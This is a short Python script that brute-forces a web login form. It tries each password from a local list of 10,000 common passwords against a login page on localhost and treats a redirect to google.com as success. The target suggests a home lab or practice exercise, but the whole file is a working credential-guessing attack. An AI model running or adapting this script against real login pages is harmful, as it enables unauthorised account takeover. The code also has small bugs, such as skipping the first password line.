import os
import requests

# Login URL
login_url = 'http://127.0.0.1/Login.php'

request_url = 'http://www.google.com/'

username = input("Username: ")

# Build Login Payload
def login(user, password):
    payload = {
        'username': user,
        'password': password,
        'submit' : 'Login'
    }
    with requests.Session() as session:
        post = session.post(login_url, data = payload)
        return post.url


with open(r"\Users\chris\Desktop\Code\Projects\Passwords\10000passwords.txt") as fp:
    line = fp.readline
    a=1
    while line:
        line = fp.readline().strip()
        x = login(username, line)
        if(x == request_url):
            print(str(a) + " - " + line + " : Sucess!")
            break
        else:
            print(str(a) + " - " + line + " : Failed")
            a=a+1